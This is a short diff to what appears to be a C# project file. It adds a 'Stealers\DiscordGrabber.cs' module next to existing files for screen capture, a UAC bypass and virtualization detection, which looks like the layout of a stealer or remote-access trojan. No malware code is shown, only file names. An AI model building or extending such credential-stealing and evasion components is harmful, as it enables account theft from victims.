@@ -119,6 +119,7 @@
     <Compile Include="Classes\Helpers\GClass.cs" />
     <Compile Include="Classes\Core\Program.cs" />
     <Compile Include="Classes\Helpers\ScreenCapture.cs" />
+    <Compile Include="Classes\Helpers\Stealers\DiscordGrabber.cs" />
     <Compile Include="Classes\Security\UACBypassHelper.cs" />
     <Compile Include="Classes\Security\VirtualizationDetection.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
